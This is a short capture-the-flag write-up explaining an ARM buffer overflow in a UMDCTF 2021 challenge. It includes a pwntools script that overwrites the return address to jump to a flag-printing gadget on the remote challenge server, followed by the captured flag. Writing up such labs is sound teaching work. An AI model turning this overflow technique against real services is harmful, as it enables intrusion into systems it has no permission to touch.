<h5>Program Behavior and ROP Exploit</h5>

<p>This program features a buffer overflow vulnerability on an ARM CPU. For identifying standard functions, please see my <a href = "#umd2021_willow">Willow writeup</a> under reverse engineering. The program requests a password, then reads up to 100 characters into a buffer where the return address is located only <code>0x2c = 44</code> bytes above the buffer.</p>

<p>The flag is located in the memory space of the remote binary. Looking just above the <code>main</code> function, there is a neat little gadget that prints the secret flag:</p>

<img class = "small" src = "./images/umd2021_furor_2.png"/>

<p>The exploit is very simple - we only need to return to this gadget. The challenge was that in the remote binary, the address of this gadget is not the same as in the binary; in fact, according to this message on the final day of the CTF, it is 76 bytes above.</p>

<p>The reason for this is unclear to me, but the payload works, so no questions asked!</p>

<h4>Payload</h4>

<pre class = "python">

from pwn import *

target = 0x1034c + 76

p = remote("chals4.umdctf.io", 7000)

p.recvline()
p.recvline()
p.sendline(b'')
p.recvuntil(b"Password: ")
p.sendline(0x2c * b'\x01' + p32(target))

p.interactive()
</pre>

<h4>Flag</h4>

<p><code>UMDCTF-{ARM_L0V3s_R0P}</code></p>
